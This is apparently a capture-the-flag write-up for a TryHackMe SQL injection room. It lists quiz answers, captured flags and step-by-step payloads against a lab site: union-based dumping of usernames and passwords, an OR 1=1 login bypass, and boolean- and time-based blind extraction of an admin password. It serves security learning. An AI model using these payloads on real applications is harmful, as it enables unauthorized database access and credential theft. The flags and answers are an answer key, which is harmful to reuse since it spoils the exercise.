# THM - SQL Injection

<br>

## Task 1

### Task 1.1

> Structured Query Language

<br>

## Task 2

### Task 2.1

> DBMS

### Task 2.2

> table

<br>

## Task 3

### Task 3.1

> SELECT

### Task 3.2

> UNION

### Task 3.3

> INSERT

<br>

## Task 4

### Task 4.1

> ;

<br>

## Task 5

http://10.10.91.147/level1

https://website.thm/article?id=1

```sql
1 UNION SELECT 1
```

```sql
1 UNION SELECT 1,2
```

```sql
1 UNION SELECT 1,2,3
```

```sql
0 UNION SELECT 1,2,3
```

```sql
0 UNION SELECT 1,2,database()
```

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

### Task 5.1

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

> THM{SQL_INJECTION_3840}

<br>

## Task 6

### Task 6.1

```sql
' OR 1=1;--
```

> THM{SQL_INJECTION_9581}

<br>

## Task 7

https://website.thm/checkuser?username=admin

https://website.thm/login

```sql
admin123' UNION SELECT 1;--
```

```sql
admin123' UNION SELECT 1,2,3;-- 
```

```sql
admin123' UNION SELECT 1,2,3 where database() like '%';--
```

```sql
admin123' UNION SELECT 1,2,3 where database() like 's%';--
```

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
```

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
```

```sql
admin123' UNION SELECT 1,2,3 from users where username like 'a%
```

```sql
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```

### Task 7.1

Username: admin
<br>
Password: 3845

> THM{SQL_INJECTION_1093}

<br>

## Task 8

https://website.thm/analytics?referrer=tryhackme.com

https://website.thm/login

```sql
admin123' UNION SELECT SLEEP(5);--
```

```sql
admin123' UNION SELECT SLEEP(5),2;--
```

```sql
referrer=admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
```

```sql
referrer=admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'sqli_four';--
```

```sql
referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' AND table_name='users';--
```

```sql
referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'username';
```

```sql
referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'password';
```

```sql
referrer=admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username LIKE 'a%';--
```

```sql
referrer=admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username LIKE 'admin';--
```

```sql
referrer=admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username LIKE 'admin' and password LIKE '3%';--
```

```sql
referrer=admin123' UNION SELECT SLEEP(3),2 FROM users WHERE username LIKE 'admin' and password LIKE '4%';--
```

```sql
referrer=admin123' UNION SELECT SLEEP(3),2 FROM users WHERE username LIKE 'admin' and password LIKE '49%';--
```

```sql
referrer=admin123' UNION SELECT SLEEP(3),2 FROM users WHERE username LIKE 'admin' and password LIKE '496%';--
```

```sql
referrer=admin123' UNION SELECT SLEEP(3),2 FROM users WHERE username LIKE 'admin' and password LIKE '4961';--
```

### Task 8.1

Username: admin
<br>
Password: 4961

> THM{SQL_INJECTION_MASTER}

<br>

## Task 9

### Task 9.1

> DNS

<br>

## Task 10

### Task 10.1

> Prepared Statements
